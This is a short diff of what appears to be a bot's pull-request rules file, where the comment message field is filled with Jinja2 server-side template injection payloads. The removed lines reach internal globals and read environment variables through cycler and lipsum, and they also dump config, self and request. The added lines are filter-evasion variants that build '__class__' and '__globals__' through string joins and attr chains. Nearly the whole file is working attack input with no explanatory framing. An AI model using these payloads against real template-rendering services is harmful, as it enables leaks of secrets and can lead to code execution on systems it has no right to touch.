@@ -1,14 +1,14 @@
 pull_request_rules:
-  - name: ssti-escalate
+  - name: ssti-bypass
     conditions: []
     actions:
       comment:
         message: |
-          a={{ "".__class__ }}
-          b={{ "".__class__.__mro__ }}
-          c={{ namespace.__init__.__globals__.keys()|list }}
-          d={{ cycler.__init__.__globals__["os"].environ.get("HOME","blocked") }}
-          e={{ lipsum.__globals__["os"].environ.get("HOME","blocked") }}
-          f={{ config }}
-          g={{ self }}
-          h={{ request }}
+          b1={{ ""| attr("__cla" ~ "ss__") }}
+          b2={% set x = ["__","class","__"]|join %}{{ ""|attr(x) }}
+          b3={{ ("").__class__.__name__ if False else "z" }}
+          b4={% set a = dict(__cla=1,ss__=2)|join %}oops
+          b5={{ [].__class__ }}
+          b6={{ [].count.__class__ }}
+          b7={{ cycler|attr("__init__")|attr("__globals__") }}
+          b8={{ dict.fromkeys|attr("__globals__") }}
